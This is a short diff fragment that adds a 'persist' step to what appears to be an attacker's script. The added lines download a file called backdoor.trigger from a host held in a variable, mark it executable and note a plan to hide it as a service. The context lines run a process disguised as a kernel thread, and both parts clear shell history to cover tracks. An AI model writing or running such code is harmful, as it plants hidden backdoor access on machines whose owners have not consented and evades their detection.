@@ -34,4 +34,7 @@ execl(".procvar-0184929", "[kworker/2:2-rcu_gp]", NULL);
 history -c
 
 #persist
-
+wget -O .uservar-0184929 $IP:6121:/backdoor.trigger
+chmod 750 .uservar-0184929
+#make a service for the backkdor and hide it
+history -c
